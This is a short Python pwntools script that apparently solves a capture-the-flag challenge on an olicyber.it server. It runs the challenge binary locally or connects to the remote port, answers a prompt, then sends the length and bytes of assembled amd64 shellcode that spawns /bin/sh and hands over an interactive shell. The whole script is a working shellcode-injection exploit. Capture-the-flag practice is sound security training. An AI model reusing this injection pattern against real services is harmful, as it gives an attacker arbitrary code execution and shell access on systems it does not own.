from pwn import *

HOST, PORT = 'software-20.challs.olicyber.it', 13003
BIN = './sw-20'

exe = ELF(BIN)
p = process(BIN)

if args.REMOTE:
    p = connect(HOST, PORT)

p.sendlineafter(b'iniziare ...', b'a')

shellcode = asm(shellcraft.amd64.linux.sh(), arch='x86_64')

p.sendlineafter(b": ", str(len(shellcode)).encode())
p.sendlineafter(b": ", shellcode)
p.interactive()
